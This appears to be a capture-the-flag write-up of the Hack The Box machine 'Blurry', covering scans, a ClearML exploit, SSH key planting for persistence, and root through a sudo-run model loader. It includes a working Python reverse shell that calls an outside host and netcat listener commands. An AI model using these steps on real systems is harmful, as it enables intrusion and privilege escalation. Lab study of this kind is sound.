**Ping**
```
ping 10.10.11.19
```
![[Pasted image 20240614114017.png]]\

**Nmap Default Scan**
```
nmap 10.10.11.19 -oN dnmap
```
![[Pasted image 20240614114119.png]]

**Nmap Script Scan and Service Scan**
```
nmap 10.10.11.19 -sC -sV -oN snmap
```
![[Pasted image 20240614114248.png]]

Nmap all Port Scan
```

```





On Port 80
We can't reach the site on port 80
So will add the Ip to out hosts file as **app.blurry.htb** 
![[Pasted image 20240614114650.png]]

Now We able to reach the site
![[Pasted image 20240614114505.png]]

Gobuster didn't work, so will go with feroxbuster


Will find is there any public exploit for CLEARML

![[Pasted image 20240614125658.png]]

We got One
![[Pasted image 20240614125734.png]]

Example use
![[Pasted image 20240614125753.png]]

Wiill do accordingly
![[Pasted image 20240614125856.png]]
Then will generate creds after creating a new project get creds

Our newly created Project
![[Pasted image 20240614130014.png]]

Will Navigate to Experiment
![[Pasted image 20240614130105.png]]
Will create a new experiment

![[Pasted image 20240614130144.png]]
Will click the Create New Credentials

![[Pasted image 20240614130225.png]]
We got our config file

Will Set up clearml in our terminal
![[Pasted image 20240614130323.png]]

Initiated clearml and pasted our cred
![[Pasted image 20240614130556.png]]

Before running the exploit, I have changed the Lhost and Lport in the code
![[Pasted image 20240614131128.png]]

Now we run the exploit
![[Pasted image 20240614130646.png]]

We got new experiment running on the Project that admin is executing
![[Pasted image 20240614130807.png]]

Will set up the listener on port 4444 and will wait for admin to execute the experiment
```
rlwrap nc -nvlp 443
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240614130921.png]]
Got the shell and upgraded my shell using python3.

Got the user.txt in jippity home directory
![[Pasted image 20240614131309.png]]






I found the Jippity's id_rsa in /.ssh directory, so I have added my public key into the authorized_key of Jippity and copied his id_rsa and got ssh session without a password.

![[Pasted image 20240614132143.png]]

Copied my id_rsa.pub to Jippity's Authorized keys
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvqEOF3sUHMdXMcutJnRBN4cSoInz1ZgUIHueLkQapyJ9/GoMJ84gyEqdrbDP4wyfGi/Ftc38lMK3zuM3En0ZtcIezY9veVilBR4YYNhegpYLEtf3s+JOoZWWK5EEGYUABheQEFUZRmKD6Hwi+NOOOOOOOOOPEAKDSOIDHPOUO(WY)nM5JsZtXUeLhGwTpuhtC3E20Jlf0PWRAJLigHvOhXOJ8pVcmvkGRU+ZCsrk0pRqCtHLEVaPTxC7kxpkUUDqo+iPVhdW/XI4+pJ6A77pxwkBNYacfdeVAjD6pkZF45x+pQ04RjPjdepEup+6S9aXWjzSkNLjt/lsYMbytCY7ujzsjxyG8JCyIvBKCe0ZD1Ab9V83T0J91MJRRMyYU1ySsljQEx9AGa6Fyt0koCNzKhZ1ujOM= root@kali" >> authorized_keys
```
![[Pasted image 20240614132328.png]]

Copied his id_rsa to my kali machine
![[Pasted image 20240614132405.png]]

The got session via ssh
```
nano id_rsa
```
```
chmod 600 id_rsa
```
```
ssh jippity@10.10.11.19 -i id_rsa
```
![[Pasted image 20240614132624.png]]

Let's find we have any sudo permissions
```
sudo -l
```
![[Pasted image 20240614141619.png]]

Lets navigate to /models directory
![[Pasted image 20240614141649.png]]

Will modify the .py file with our reverse shell code
```
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.4", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("sh")
```
![[Pasted image 20240614141727.png]]

Before running this code, will setup listener on port 443
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240614141822.png]]

Now will exploit the code
```
sudo /usr/bin/evaluate_model /models/*.pth
```
![[Pasted image 20240614141910.png]]

Got Reverse shell as root
![[Pasted image 20240614141933.png]]

Lets upgrade the shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240614142057.png]]

Got the Root.txt file in root directory
![[Pasted image 20240614142143.png]]


Done with Blurry......:)